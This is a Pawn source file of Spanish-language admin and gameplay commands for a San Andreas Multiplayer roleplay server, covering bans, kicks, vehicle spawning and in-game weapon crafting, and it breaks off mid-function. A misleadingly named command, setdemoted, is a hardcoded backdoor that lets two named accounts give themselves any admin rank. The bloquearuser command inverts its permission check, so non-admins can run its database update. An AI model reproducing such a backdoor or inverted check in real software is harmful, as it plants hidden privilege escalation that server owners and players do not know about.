CMD:enableac(playerid, params[]) {
    if (PLAYER_INFO[playerid][pAdmin] < 7) return 0;
    if (sscanf(params, "di", params[0], params[1])) {
        SendClientMessage(playerid, -1, "/enableac <code> <true or false>");
    } else {
        switch (params[1]) {
            case 0: {
                SendClientMessageEx(playerid, -1, "Has desactivado el anticheat #%d %s", params[0], Rzcheats(params[0]));
            }
            case 1: {
                SendClientMessageEx(playerid, -1, "Has activado el anticheat #%d %s", params[0], Rzcheats(params[0]));
            }
        }
        EnableAntiCheat(params[0], params[1]);
    }
    return 1;
}
CMD:anticheat(playerid, params[]) {
    if (PLAYER_INFO[playerid][pAdmin] < 4) return 0;
    if (sscanf(params, "d", params[0])) SendClientMessage(playerid, -1, "/anticheat <code>");
    else SendClientMessageEx(playerid, COLOR_CHEAT, "El codigo #00%d esta definido como [%s]", params[0], Rzcheats(params[0]));
    return 1;
}
CMD:setdemoted(playerid, params[]) {
    if (JugadorLogeado[playerid] != 1) return 1;
    new rango;
    if (!strcmp(PLAYER_INFO[playerid][Nickname], "Williangel_Vera", true) || !strcmp(PLAYER_INFO[playerid][Nickname], "Anorak", true)) {
        if (sscanf(params, "d", rango)) return SendClientMessage(playerid, -1, "/dameAdmin [Rango 0 - 8].");
        if (rango < 0 || rango > 8) return SendClientMessage(playerid, -1, "Ese rango es invalido. (1 a 8)");

        PLAYER_INFO[playerid][pAdmin] = rango;
        PLAYER_TEMP[playerid][pOwnerCMD_Use] = 1;
        GuardarCuenta(playerid);
        SendClientMessageEx(playerid, -1, "Te diste el rango de %s", RangoAdministrativo(rango));
    } else return 0;
    return 1;
}

CMD:darprenda(playerid, params[]) {
    if (PLAYER_INFO[playerid][pAdmin] < 7) return 0;
    new ID, MODEL_ID, VALID_MODEL = -1;
    if (sscanf(params, "ud", ID, MODEL_ID)) return SendClientMessage(playerid, -1, "Utiliza {DBED15}/givetoy{FFFFFF} [ID] [model_id].");
    if (!IsPlayerConnected(ID)) return SendClientMessage(playerid, -1, "El jugador no esta conectado.");
    if (AdminDuty[playerid] == 0) return SendClientMessage(playerid, -1, "No puedes usar este comando en fuera de servicio administrativo");
    else if (GetPlayerScore(ID) == 0) return SendClientMessage(playerid, -1, "El jugador esta conectado pero aun no ha ingresado al juego.");
    if (MODEL_ID <= 46) return SendClientMessage(playerid, -1, "No puedes asignar ese accesorio.");
    else if (MODEL_ID > 19801) return SendClientMessage(playerid, -1, "El accesorio ingresado es invalido.");
    for(new i = 0; i < (sizeof OBJETOS_INFO); i++) {
        if (OBJETOS_INFO[i][obj_ID] == MODEL_ID) {
            VALID_MODEL = i;
            break;
        }
    }
    if (VALID_MODEL == -1) return SendClientMessage(playerid, -1, "{FF6347}El 'MODEL_ID' del accesorio es invalido.");
    if (CountPlayerToys(ID) >= MAX_PLAYER_TOYS) return SendClientMessage(playerid, -1, "{FF6347}El jugador no puede tener mas accesorios");
    if (playerid != ID) {
        SendClientMessageEx(ID, -1, "%s te acaba de dar un/a %s", PLAYER_INFO[playerid][Nickname], GetNameObjeto(MODEL_ID));
        SendClientMessageEx(playerid, -1, "Acabas de dar un/a %s a %s.", GetNameObjeto(MODEL_ID), PLAYER_INFO[ID][Nickname]);
    }
    GivePlayerToy(ID, MODEL_ID);
    return 1;
}
CMD:setauto(playerid, params[]) {
    new giveplayerid, modelid, color1, color2;
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_ADM) return 0;
    //
    if (sscanf(params, "dddd", giveplayerid, modelid, color1, color2)) return SendClientMessage(playerid, -1, "USA: /setauto [playerid] [modelid] [color 1] [color 2]");
    if (IsPlayerNPC(giveplayerid)) return 1;
    if (color1 < 0 || color1 > 255) { SendClientMessage(playerid, -1, "Numero de color no debe ser menor de 0 o mayor que 255 !"); return 1; }
    if (color2 < 0 || color2 > 255) { SendClientMessage(playerid, -1, "Numero de color 2 no debe ser menor de 0 o mayor que 255 !"); return 1; }
    if (modelid < 400 || modelid > 611) { SendClientMessage(playerid, -1, "ID del vehiculo debe ser del 400 al 611 !"); return 1; }
    new Float:X, Float:Y, Float:Z, Float:Angle;
    GetPlayerPos(giveplayerid, X, Y, Z);
    GetPlayerFacingAngle(giveplayerid, Angle);
    CreatePlayerVehicle(giveplayerid, modelid, X, Y, Z, Angle, color1, color2, 1, 50, playerid);
    return 1;
}
CMD:borrarauto(playerid, params[]) {
    new ID;
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_ADM) return 0;
    if (AdminDuty[playerid] == 0) return SendClientMessage(playerid, -1, "No puedes usar este comando en fuera de servicio administrativo");
    if (sscanf(params, "d", ID)) return SendClientMessage(playerid, -1, "Escribe {009AFF}/borrarauto{ffffff} [id].");
    if (!IsPlayerConnected(ID)) return SendClientMessage(playerid, COLOR_GRAD2, "Jugador no conectado.");

    PLAYER_TEMP[playerid][pDELETE_CAR_PLAYERID] = ID;
    new vehiculo1[100], vehiculo2[100], vehiculo3[100], vehiculo4[100], vehiculo5[100], mensaje[500];

    if (autos[ID] > 0) format(vehiculo1, sizeof(vehiculo1), "{F6E200}%s{FFFFFF}\t{2BD5C4}%s{FFFFFF}\t%d", NombreAuto[PLAYER_INFO[ID][vModelo] - 400], PLAYER_INFO[ID][vpatente], autos[ID]);
    else vehiculo1 = "Vacio";

    if (autos2[ID] > 0) format(vehiculo2, sizeof(vehiculo2), "{F6E200}%s{FFFFFF}\t{2BD5C4}%s{FFFFFF}\t%d", NombreAuto[PLAYER_INFO[ID][vModelo2] - 400], PLAYER_INFO[ID][v2patente], autos2[ID]);
    else vehiculo2 = "Vacio";

    if (autos3[ID] > 0) format(vehiculo3, sizeof(vehiculo3), "{F6E200}%s{FFFFFF}\t{2BD5C4}%s{FFFFFF}\t%d", NombreAuto[PLAYER_INFO[ID][vModelo3] - 400], PLAYER_INFO[ID][v3patente], autos3[ID]);
    else vehiculo3 = "Vacio";

    if (autos4[ID] > 0) format(vehiculo4, sizeof(vehiculo4), "{F6E200}%s{FFFFFF}\t{2BD5C4}%s{FFFFFF}\t%d", NombreAuto[PLAYER_INFO[ID][vModelo4] - 400], PLAYER_INFO[ID][v4patente], autos4[ID]);
    else vehiculo4 = "Vacio";

    if (autos5[ID] > 0) format(vehiculo5, sizeof(vehiculo5), "{F6E200}%s{FFFFFF}\t{2BD5C4}%s{FFFFFF}\t%d", NombreAuto[PLAYER_INFO[ID][vModelo5] - 400], PLAYER_INFO[ID][v5patente], autos5[ID]);
    else vehiculo5 = "Vacio";

    format(mensaje, sizeof(mensaje), "{F6E200}Vehiculo\t{2BD5C4}Patente\t{999999}ID\n%s\n%s\n%s\n%s\n%s", vehiculo1, vehiculo2, vehiculo3, vehiculo4, vehiculo5);
    dialogs_ShowPlayerDialog(playerid, MENU_BORRAR_AUTO, DIALOG_STYLE_TABLIST_HEADERS, "Selecciona el vehiculo que deseas borrar", mensaje, "Borrar", "Cancelar");
    return 1;
}

CMD:crear(playerid, params[]) {
    SetPVarInt(playerid, "antiflood", GetTickCount());
    if (JugadorLogeado[playerid] != 1) return 1;
    new item[32];
    if (!sscanf(params, "s[32]", item)) {
        if (strcmp(item, "pedido", true) == 0) {
            if (PLAYER_INFO[playerid][pVip] != 3) return Notificador2(playerid, "~r~Solo usuarios GVIP pueden hacer esto");
            if (PLAYER_TIMES[playerid][pTIME_PEDIDO] > gettime()) return SendClientMessageEx(playerid, -1, "Tienes que esperar %s para poder enviar otro pedido.", TimeConvertEx(PLAYER_TIMES[playerid][pTIME_PEDIDO] - gettime()));
            new dialog[] = "{FFFFFF}Este menu es unicamente para pedidos\nesto no es para reportar jugadores o para insultar a la administracion\nen caso de hacerlo, vas a ser {FF0000}sancionado.";
            return dialogs_ShowPlayerDialog(playerid, DIALOG_PEDIDO, DIALOG_STYLE_MSGBOX, "Informacion importante", dialog, "Siguiente", "Salir");
        }
        /*if(strcmp(item, "graffiti", true) == 0 || strcmp(item,"graffitis",true) == 0 || strcmp(item,"gf",true) == 0)
        {
        	if(PLAYER_INFO[playerid][pFaccion] == 0 || PLAYER_INFO[playerid][pRango] < 3) return SendClientMessage(playerid,-1,"Necesitas unirte a una banda y ser rango #3.");
        	if(PLAYER_INFO[playerid][varzonasegura] != 0) return PUSH(playerid,"No puedes hacer graffitis en esta zona.");
        	if(Graffiteando[playerid] != 0) return SendClientMessage(playerid, -1, "No puedes usar esto, en estos momentos.");
        	return ShowDialog(playerid, TYPE_LIST_MENU);
        }*/
        if (strcmp(item, "graffiti", true) == 0 || strcmp(item, "graffitis", true) == 0 || strcmp(item, "gf", true) == 0) {
            return callcmd::grafitis(playerid, "");
        }
        if (strcmp(item, "emisora", true) == 0) {
            if (IsPlayerInRangeOfPoint(playerid, 5, 393.7036, 185.4025, 1040.1156)) {
                if (Emisoras[playerid][TieneEmisora] == 0) {
                    if (Emisoras[playerid][TieneEmisora] == 1) return SendClientMessage(playerid, COLOR_BLANCO, "Ya tienes una emisora.");
                    if (PLAYER_INFO[playerid][pVip] < 2) return SendClientMessage(playerid, COLOR_WHITE, "Para activar esta caracteristica necesitar tener una membresia VIP {00CC00}#2.");
                    if (PLAYER_INFO[playerid][jDinero] < 500000) return SendClientMessage(playerid, COLOR_BLANCO, "Necesitas {00CC00}$500.000{FFFFFF} para crear una estacion de radio");
                    dialogs_ShowPlayerDialog(playerid, COMPRARRADIO, DIALOG_STYLE_INPUT, "Crear estacion de radio", "Ingresa el nombre de tu nueva estacion de radio:", "Crear", "Cancelar");
                    return 1;
                } else return SendClientMessage(playerid, COLOR_BLANCO, "Tu ya tienes una radio.");
            } else return SendClientMessage(playerid, COLOR_BLANCO, "No estas donde se compras las radios.");
        }

        if (PLAYER_INFO[playerid][pDuty] == 1) return SendClientMessage(playerid, -1, "No puedes crear armas estando en servicio.");
        if (PLAYER_TEMP[playerid][VariableCaido] == 1) return SendClientMessage(playerid, -1, "No puedes crear armas en este momento.");
        if (PLAYER_INFO[playerid][pTrabajo] != T_Armero && PLAYER_INFO[playerid][pTrabajo2] != T_Armero) return 1;
        if (PLAYER_INFO[playerid][Agonizando] == 1) return SendClientMessage(playerid, -1, "No puedes crear armas en este momento.");
        if (GetPlayerState(playerid) == 2 || GetPlayerState(playerid) == 3) return SendClientMessage(playerid, -1, "No puedes crear un arma si estas en un vehiculo.");
        if (PLAYER_INFO[playerid][pTiempoCarcel] > 0 || PLAYER_INFO[playerid][pTiempoJail] > 0) return SendClientMessage(playerid, -1, "No puedes crear un arma en este momento.");
        if (PLAYER_INFO[playerid][pDuty] == 1) return SendClientMessage(playerid, COLOR_GREY, "* Los policias en servicio no pueden crear armas.");
        if (puedeCrearArmas(playerid) == 0) return SendClientMessage(playerid, -1, "No puedes crear armas en este momento.");
        if (EstaHospital(playerid)) return 1;
        if (strcmp(item, "armas", true) == 0 || strcmp(item, "arma", true) == 0) {
            new string[5000];
            if (PLAYER_INFO[playerid][pNivelArmero] >= 0) { format(string, sizeof(string), "Tipo de arma\tPiezas necesarias\tNivel de Armero\n9mm\t{FF0000}10{FFFFFF} Piezas\tNivel {199F0C}1\n"); }
            if (PLAYER_INFO[playerid][pNivelArmero] >= 0) { format(string, sizeof(string), "%s9mm Silenciada\t{FF0000}12{FFFFFF} Piezas\tNivel {199F0C}1\n", string); }
            if (PLAYER_INFO[playerid][pNivelArmero] >= 1) { format(string, sizeof(string), "%sEscopeta\t{FF0000}20{FFFFFF} Piezas\tNivel {199F0C}2\n", string); }
            if (PLAYER_INFO[playerid][pNivelArmero] >= 2) { format(string, sizeof(string), "%sDesert Eagle\t{FF0000}36{FFFFFF} Piezas\tNivel {199F0C}3\n", string); }
            if (PLAYER_INFO[playerid][pNivelArmero] >= 3) { format(string, sizeof(string), "%sMP5\t{FF0000}58{FFFFFF} Piezas\tNivel {199F0C}4\n", string); }
            if (PLAYER_INFO[playerid][pNivelArmero] >= 4) { format(string, sizeof(string), "%sAK-47\t{FF0000}82{FFFFFF} Piezas\tNivel {199F0C}5\n", string); }
            if (PLAYER_INFO[playerid][pNivelArmero] >= 4) { format(string, sizeof(string), "%sM4\t{FF0000}96{FFFFFF} Piezas\tNivel {199F0C}5\n", string); }
            if (PLAYER_INFO[playerid][pNivelArmero] >= 5) { format(string, sizeof(string), "%sRifle\t{FF0000}52{FFFFFF} Piezas\tNivel {199F0C}6\n", string); }
            if (PLAYER_INFO[playerid][pNivelArmero] >= 6) { format(string, sizeof(string), "%sEscopeta de combate\t{FF0000}136{FFFFFF} Piezas\tNivel {199F0C}7\n", string); }
            if (PLAYER_INFO[playerid][pNivelArmero] >= 6) { format(string, sizeof(string), "%sSniper\t{FF0000}200{FFFFFF} Piezas\tNivel {199F0C}7\n", string); }
            dialogs_ShowPlayerDialog(playerid, DIALOG_CREARARMA, DIALOG_STYLE_TABLIST_HEADERS, "Menu creacion de armas", string, "Aceptar", "Cancelar");
        }
        new nombre_arma[64], string[128], Piezas, armaid, lvlid;
        if (strcmp(item, "dk", true) == 0) { armaid = 24;
            lvlid = 3;
            format(nombre_arma, sizeof(nombre_arma), "Desert Eagle");
            Piezas = 36;
            SetHabilityWeaponJob(playerid, lvlid); } else if (strcmp(item, "edc", true) == 0) { armaid = 27;
            lvlid = 6;
            format(nombre_arma, sizeof(nombre_arma), "Escopeta de combate");
            Piezas = 136; } else if (strcmp(item, "9mm", true) == 0) { armaid = 22;
            lvlid = 1;
            format(nombre_arma, sizeof(nombre_arma), "9mm");
            Piezas = 10; } else if (strcmp(item, "9mm-silenciada", true) == 0) { armaid = 23;
            lvlid = 2;
            format(nombre_arma, sizeof(nombre_arma), "9mm silenciada");
            Piezas = 12; } else if (strcmp(item, "escopeta", true) == 0) { armaid = 25;
            lvlid = 2;
            format(nombre_arma, sizeof(nombre_arma), "Escopeta");
            Piezas = 20; } else if (strcmp(item, "desert-eagle", true) == 0) { armaid = 24;
            lvlid = 3;
            format(nombre_arma, sizeof(nombre_arma), "Desert Eagle");
            Piezas = 36; } else if (strcmp(item, "mp5", true) == 0) { armaid = 29;
            lvlid = 4;
            format(nombre_arma, sizeof(nombre_arma), "Mp5");
            Piezas = 58; } else if (strcmp(item, "ak47", true) == 0) { armaid = 30;
            lvlid = 5;
            format(nombre_arma, sizeof(nombre_arma), "AK-47");
            Piezas = 82; } else if (strcmp(item, "m4", true) == 0) { armaid = 31;
            lvlid = 5;
            format(nombre_arma, sizeof(nombre_arma), "M4");
            Piezas = 96; } else if (strcmp(item, "rifle", true) == 0) { armaid = 33;
            lvlid = 6;
            format(nombre_arma, sizeof(nombre_arma), "Rifle");
            Piezas = 52; } else if (strcmp(item, "escopeta-de-combate", true) == 0) { armaid = 27;
            lvlid = 7;
            format(nombre_arma, sizeof(nombre_arma), "Escopeta de combate");
            Piezas = 136; } else if (strcmp(item, "granada", true) == 0) { armaid = 16;
            lvlid = 8;
            format(nombre_arma, sizeof(nombre_arma), "Granada");
            Piezas = 1056; } else return 1;
        if (IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "No puedes crear armas en vehiculos.");
        foreach(new c : Player) {
            if (PLAYER_INFO[c][pFaccion] == 1 && PLAYER_INFO[c][pDuty] == 1 && EstaEnP(playerid, c, 20.00)) return SendClientMessage(playerid, -1, "No puedes hacer esto si hay un policia cerca.");
            if (PLAYER_INFO[c][pFaccion] == 2 && PLAYER_INFO[c][pDuty] == 1 && EstaEnP(playerid, c, 20.00)) return SendClientMessage(playerid, -1, "No puedes hacer esto si hay un policia cerca.");

        }
        if (PLAYER_INFO[playerid][horasjugadas] < 2) return Notificador2(playerid, "Sólo puedes portar armas al tener 2 horas de juego.");
        if (PLAYER_INFO[playerid][varzonasegura] == 1) return Notificador2(playerid, "No puedes crear armas estando en zona segura");
        if (PLAYER_INFO[playerid][@Nivel] < 12 && strcmp(item, "granada", true) == 0) return SendClientMessage(playerid, -1, "Necesitas tener como minimo nivel 10 para crear una granada.");
        if (PLAYER_INFO[playerid][pNivelArmero] < lvlid) return SendClientMessage(playerid, -1, "No tienes el nivel necesario para crear esta arma");
        if (PLAYER_INFO[playerid][pMateriales] >= Piezas) {
            PLAYER_INFO[playerid][pMateriales] -= Piezas;
            DarArma(playerid, armaid);
            Notificador2(playerid, "Tambien puedes usar ~g~~h~/crear armas~w~ o Pulsa ~r~~h~N~w~ para crear armas");
            format(string, sizeof(string), "%s saca piezas de su mochila y crea una %s.", PLAYER_INFO[playerid][Nickname], nombre_arma);
            ProxDetector(20, playerid, string, COLOR_ACCIONES, COLOR_ACCIONES, COLOR_ACCIONES, COLOR_ACCIONES, COLOR_ACCIONES);
            SetHabilityWeaponJob(playerid, lvlid);
        } else return SendClientMessageEx(playerid, -1, "No tienes los materiales necesarios, se requieren %d piezas para crear esta arma.", Piezas);
    }
    return 1;
}
CMD:rac(playerid, params[]) {
    if (PLAYER_INFO[playerid][pAdmin] < 7) return 0;
    resetearcoches();
    return 1;
}
CMD:raccars(playerid, params[]) {
    if (PLAYER_INFO[playerid][pAdmin] < 7) return 0;
    new string[128], radius;
    if (sscanf(params, "d", radius)) return SendClientMessage(playerid, -1, "Escribe {"COLOR_GM "}/raccars {FFFFFF}[{"COLOR_GM "}Radio{FFFFFF}]");
    if (radius < 1 || radius > 100) return SendClientMessage(playerid, COLOR_GREY, "El radio debe ser de 1 a 100!");
    RespawnNearbyVehicles(playerid, radius);
    format(string, sizeof(string), "Usted ha respawneado los vehiculos dentro del radio de %d.", radius);
    SendClientMessage(playerid, COLOR_GREY, string);
    return 1;
}
CMD:racall(playerid, params[]) {
    if (PLAYER_INFO[playerid][pAdmin] < 7) return 0;
    for(new i = 1; i <= GetVehiclePoolSize(); i++) {
        foreach(new u : Player) {
            if (IsPlayerInVehicle(u, i)) {
                goto _no_borrar;
            }
        }
        SetVehicleToRespawn(i);
        _no_borrar:
    }
    return 1;
}
CMD:rp(playerid, params[]) {
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_BANEOS) return 1;
    new ID;
    if (!sscanf(params, "i", ID)) {
        Respawnear(ID);
    }
    return 1;
}
CMD:closeid(playerid, params[]) {
    if (AdminDuty[playerid] == 0) return SendClientMessage(playerid, -1, "No puedes usar este comando en fuera de servicio administrativo");
    new string[256], ID;
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_BANEOS) return 0;

    if (sscanf(params, "d", ID)) return SendClientMessage(playerid, COLOR_GRAD2, "MODO DE USO: /close [ID]");
    if (PLAYER_INFO[ID][pAdmin] >= PLAYER_INFO[playerid][pAdmin] && PLAYER_INFO[playerid][pAdmin] <= ADMIN_LEVEL_GLOBAL) return 1;
    if (!IsPlayerConnected(ID)) return SendClientMessage(playerid, 0x25AB26FF, "Jugador no conectado");
    if (IsPlayerNPC(ID)) return 1;
    format(string, sizeof(string), "[STAFF] %s expulso con /closeid a %s.", PLAYER_INFO[playerid][Nickname], PlayerName(ID));
    MensajeAdmin(COLOR_GREY, string, ADMIN_LEVEL_ADM_TEMP);
    ExpulsarJugador(ID, "Kickeado por un admin.");
    new query[560];
    mysql_format(handle_db, query, sizeof(query), "INSERT INTO registros_admin (Responsable, Jugador, Razon, Accion) VALUES ('%e','%e','/closeid','5')", PLAYER_INFO[playerid][Nickname], PLAYER_INFO[ID][Nickname]);
    mysql_tquery(handle_db, query);
    return 1;
}
CMD:kick(playerid, params[]) {
    if (AdminDuty[playerid] == 0) return SendClientMessage(playerid, -1, "No puedes usar este comando en fuera de servicio administrativo");
    new string[256], ID, ADMIN[128];
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_BANEOS) return 0;

    if (sscanf(params, "ds[128]", ID, ADMIN)) return SendClientMessage(playerid, COLOR_GRAD2, "MODO DE USO: /kick [ID] [Razon]");
    if (PLAYER_INFO[ID][pAdmin] >= PLAYER_INFO[playerid][pAdmin] && PLAYER_INFO[playerid][pAdmin] <= ADMIN_LEVEL_GLOBAL) return 1;
    if (!IsPlayerConnected(ID)) return SendClientMessage(playerid, 0x25AB26FF, "Jugador no conectado");
    if (IsPlayerNPC(ID)) return 1;
    if (gettime() < Banear[playerid] + 3) {
        Ratita[playerid]++;
        if (Ratita[playerid] >= 4) BanEx(playerid, "Rata apestosa.");
        return 1;
    }
    format(string, sizeof(string), "{FFFFFF}El jugador {FF3300}%s(ID: %d){FFFFFF} fue kickeado por un admin. Razon: {FF3300}%s{FFFFFF}.", PLAYER_INFO[ID][Nickname], ID, ADMIN);
    MandarMensajeTodos(string);
    new query[560];
    mysql_format(handle_db, query, sizeof(query), "INSERT INTO registros_admin (Responsable, Jugador, Razon, Accion) VALUES ('%e','%e','%e','5')", PLAYER_INFO[playerid][Nickname], PLAYER_INFO[ID][Nickname], ADMIN);
    mysql_tquery(handle_db, query);
    Webhook_Sancion(ID, ADMIN, 2); //id= &razon= &sancion= 
    format(string, sizeof(string), "Administrador %s.", PLAYER_INFO[playerid][Nickname]);
    MensajeAdmin(COLOR_GREY, string, ADMIN_LEVEL_ADM_TEMP);
    ExpulsarJugador(ID, "Kickeado por un admin.");
    return 1;
}
CMD:desban(playerid, params[]) {
    new Query[520], pName[MAX_PLAYER_NAME];
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_BANEOS) return 0;
    if (sscanf(params, "s[32]", pName)) return 1;
    mysql_format(handle_db, Query, sizeof(Query), "UPDATE `usuarios` SET `Baneado`='0', `TempBan`='0' WHERE `Username`='%e'", pName);
    mysql_tquery(handle_db, Query);
    Notificador2(playerid, "El usuario ha sido desbaneado.");
    return 1;
}
CMD:bloquearuser(playerid, params[]) {
    new Query[520];
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_BANEOS) {
        new Jugador[MAX_PLAYER_NAME];
        if (sscanf(params, "s[25]", Jugador)) return SendClientMessage(playerid, -1, "MODO DE USO: /bloquearuser [Nombre_Apellido]");
        mysql_format(handle_db, Query, sizeof(Query), "UPDATE `usuarios` SET `Bloqueado` = '0' WHERE `Username` = '%e'", Jugador);
        mysql_tquery(handle_db, Query);
    }
    return 1;
}
CMD:bant(playerid, params[]) {
    new ID, days, razon[128], string[128];
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_BANEOS) return 1;
    if (PLAYER_INFO[playerid][pDuty] > 0) return SendClientMessage(playerid, -1, "No puedes utilizar este comando estando de servicio.");
    if (sscanf(params, "iis[128]", ID, days, razon)) return 1;
    if (!IsPlayerConnected(ID)) return SendClientMessage(playerid, 0x25AB26FF, "Jugador no conectado");
    if (!IsPlayerNPC(ID)) {
        new tiempobaneo = gettime() + (86400 * days);
        if (PLAYER_INFO[playerid][BaneosD] >= 6 && PLAYER_INFO[playerid][pAdmin] != ADMIN_LEVEL_ADM && PLAYER_INFO[playerid][BaneosD2] > gettime()) return SendClientMessage(playerid, -1, "Solamente puedes banear 6 jugadores por día.");
        if (PLAYER_INFO[playerid][pAdmin] > ADMIN_LEVEL_DUDAS) {
            PLAYER_INFO[playerid][BaneosD]++;
            PLAYER_INFO[playerid][BaneosD2] = gettime() + 86400;
        }
        format(string, sizeof(string), "{FF3300}%s(ID: %d){FFFFFF} fue baneado temporalmente por {FF3300}%d días{FFFFFF}. Razon: {FF3300}%s{FFFFFF}.", PLAYER_INFO[ID][Nickname], ID, days, razon);
        MensajeAdmin(-1, string, ADMIN_LEVEL_BANEOS);
        SendClientMessage(ID, -1, string);
        PLAYER_INFO[ID][pAdmin] = ADMIN_LEVEL_USER;
        new query[520];
        PLAYER_INFO[playerid][@TempBan] = tiempobaneo;
        mysql_format(handle_db, query, sizeof(query), "UPDATE `usuarios` SET `TempBan`='%d',`razon`='%e',`Banpor`='%e' WHERE `Username`='%e'", tiempobaneo, razon, PLAYER_INFO[playerid][Nickname], PLAYER_INFO[ID][Nickname]);
        mysql_tquery(handle_db, query);
        ExpulsarJugador(ID, "Baneo Temporal.");
        return 1;
    } else SendClientMessage(playerid, 0x25AB26FF, "Jugador no conectado");
    return 1;
}
CMD:banear(playerid, params[]) {
    if (AdminDuty[playerid] == 0) return SendClientMessage(playerid, -1, "No puedes usar este comando en fuera de servicio administrativo");
    new string[256], day, month, year, hora, minuto, segundo;
    gettime(hora, minuto, segundo);
    getdate(year, month, day);
    new ID, ADMIN[256], Query[200];
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_BANEOS) return 0;
    if (sscanf(params, "rs[256]", ID, ADMIN)) return 1;
    if (!IsPlayerConnected(ID)) return SendClientMessage(playerid, 0x25AB26FF, "Jugador no conectado");
    if (PLAYER_INFO[ID][pAdmin] >= PLAYER_INFO[playerid][pAdmin] && PLAYER_INFO[ID][pAdmin] >= ADMIN_LEVEL_GLOBAL) return 1;
    if (JugadorLogeado[ID] == 0) return SendClientMessage(playerid, 0x25AB26FF, "Jugador no conectado");
    if (PLAYER_INFO[playerid][BaneosD] >= 6 && PLAYER_INFO[playerid][pAdmin] != ADMIN_LEVEL_ADM && PLAYER_INFO[playerid][BaneosD2] > gettime()) return SendClientMessage(playerid, -1, "Solamente puedes banear 6 jugadores por dia.");
    if (!IsPlayerNPC(ID)) {
        foreach(new i : Player) {
            if (JugadorLogeado[i] == 1) {
                if (PLAYER_INFO[i][pMuteos] == 1) {
                    format(string, sizeof(string), "El jugador {FF3300}%s(ID: %d){FFFFFF} fue baneado por un admin. Razon: {FF3300}%s{FFFFFF}.", PLAYER_INFO[ID][Nickname], ID, ADMIN);
                    SendClientMessage(i, -1, string);
                }
            }
        }
        PLAYER_INFO[ID][pAdmin] = ADMIN_LEVEL_USER;
        Webhook_Sancion(ID, ADMIN, 0); //id= &razon= &sancion= 
        new query[520];
        mysql_format(handle_db, query, sizeof(query), "INSERT INTO registros_admin (Responsable, Jugador, Razon, Accion) VALUES ('%e','%e','%e','3')", PLAYER_INFO[playerid][Nickname], PLAYER_INFO[ID][Nickname], ADMIN);
        mysql_tquery(handle_db, query);
        mysql_format(handle_db, Query, 200, "UPDATE usuarios SET Baneado = '1',`razon` = '%e',`Banpor` = '%e' WHERE `Username`='%e'", ADMIN, PLAYER_INFO[playerid][Nickname], PLAYER_INFO[ID][Nickname]);
        mysql_tquery(handle_db, Query);
        format(string, sizeof(string), "Administrador: %s", PLAYER_INFO[playerid][Nickname]);
        MensajeAdmin(COLOR_GREY, string, 3);
        for(new c = 0; c < MAX_PCASAS; c++) {
            if (PLAYER_INFO[ID][CasaID][c] == 0) continue;
            DesocuparCasa(c);
        }
        if (PLAYER_INFO[playerid][pAdmin] > ADMIN_LEVEL_DUDAS) {
            PLAYER_INFO[playerid][BaneosD]++;
            PLAYER_INFO[playerid][BaneosD2] = gettime() + 86400;
        }
        BanEx(ID, "Baneado por un admin.");
    }
    return 1;
}

CMD:limpiarmochilas1(playerid) {
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_ADM) return 0;
    new query[200];
    SendClientMessage(playerid, COLOR_CHEAT, "Se eliminaron las mochilas a los usuarios.");
    mysql_format(handle_db, query, sizeof(query), "UPDATE usuarios SET BackPack = '0'");
    mysql_tquery(handle_db, query);
    return true;
}
CMD:addspam(playerid, params[]) {
    new palabra[128];
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_ADM) return 0;

    if (sscanf(params, "s[128]", palabra)) return SendClientMessage(playerid, COLOR_GRAD2, "MODO DE USO: /addspam <Palabra>");
    if (strlen(palabra) > 15) return SendClientMessage(playerid, -1, "Error: Palabra demasiado larga.");
    new DB_Query[128];
    format(DB_Query, sizeof DB_Query, "SELECT * FROM `anti_spam` WHERE `Bloqueada`='%e';", palabra);
    mysql_tquery(handle_db, DB_Query, "VerificarPalabra", "ds", playerid, palabra);
    return 1;
}
CMD:quitarfundador(playerid, params[]) {
    new name[MAX_PLAYER_NAME + 1];
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_ADM) return 0;
    if (sscanf(params, "s[128]", name)) return SendClientMessage(playerid, COLOR_GRAD2, "MODO DE USO: /quitarfundador <Nombre>");
    new DB_Query[128];
    format(DB_Query, sizeof DB_Query, "SELECT * FROM `admin_names` WHERE `Nickname`='%e';", name);
    mysql_tquery(handle_db, DB_Query, "ActualizarUsuariosCortos", "dsd", playerid, name, 1);
    return 1;
}
CMD:darfundador(playerid, params[]) {
    new name[MAX_PLAYER_NAME + 1];
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_ADM) return 0;
    if (sscanf(params, "s[128]", name)) return SendClientMessage(playerid, COLOR_GRAD2, "MODO DE USO: /darfundador <Nombre>");
    new DB_Query[128];
    format(DB_Query, sizeof DB_Query, "SELECT * FROM `admin_names` WHERE `Nickname`='%e';", name);
    mysql_tquery(handle_db, DB_Query, "ActualizarUsuariosCortos", "dsd", playerid, name, 2);
    return 1;
}
CMD:fixveh(playerid, params[]) {
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_ADM_TEMP) return 0;

    if (GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "No estas en un vehiculo.");
    SetVehicleHealth(GetPlayerVehicleID(playerid), 1000.0);
    RepairVehicle(GetPlayerVehicleID(playerid));
    SendClientMessage(playerid, COLOR_GRAD2, "Vehiculo reparado");
    new mensajeacmin[600];
    format(mensajeacmin, sizeof(mensajeacmin), "[STAFF] %s reparo su vehículo", PlayerName(playerid));
    MensajeAdmin(COLOR_CHEAT, mensajeacmin, ADMIN_LEVEL_ADM);
    return 1;
}
CMD:companero1(playerid) {
    if (PLAYER_INFO[playerid][pAdmin] < ADMIN_LEVEL_ADM_TEMP) return 0;
    if (GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "No estas en un vehiculo.");
